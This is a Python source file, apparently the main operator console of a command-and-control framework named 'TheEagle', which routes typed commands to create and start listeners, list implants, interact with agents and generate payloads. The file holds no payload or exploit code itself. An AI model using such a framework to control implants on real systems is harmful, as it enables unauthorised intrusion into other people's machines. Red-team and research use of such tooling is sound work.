from code import interact
import C2Database, color
from tabulate import tabulate
import threading
from flask import Flask
import sqlite3
import httplistener
from implantcommands import GenerateImplant
import listenercommands, helper, os, banner, sys
import databasecommands, interactcommands


def Start(conn):

   while True:
    connection = C2Database.ConnectDatabase.Connect()
    command = input("[%s%s%s]%s " % (color.red("TheEagle"),color.yellow("@"),color.cyan("C2"),color.yellow("::>"))).strip().lower()
    if command == "create listener":
            listenercommands.CreateListener()
    elif command == "list listeners":
            listenercommands.ListListeners()
    elif command == "list implants":
        listenercommands.ListImplants()
    elif command == "delete listener":
            listenercommands.DeleteListeners()
    elif command == "start listener":
            listenercommands.StartIt()
    elif command == "help listeners":
        helper.ListenerHelper()
    elif command == "help database":
            helper.DatabaseHelper()
    elif command == "help payloads":
        helper.PayloadHelper()
    elif command == "help implants":
        helper.ImplantsHelper()
    elif command == "delete database":
        databasecommands.Deletedatabase()
    elif command == "help commands":
        helper.CommandHelper()
    elif command == "help interact":
        helper.InteractHelper()
    elif command == "interact":
        listenercommands.ListImplants()
        AgentName = input(color.cyan("\n[+] What is the name of the agent you want to interact with?: "))
        interactcommands.Interact("interact", AgentName)
    elif command == "generate payload":
        GenerateImplant()    
    elif command == "clear":
        os.system('cls') 
        banner.PrintBanner()
        banner.HelpBanner()
    elif command == "exit":
           sys.exit()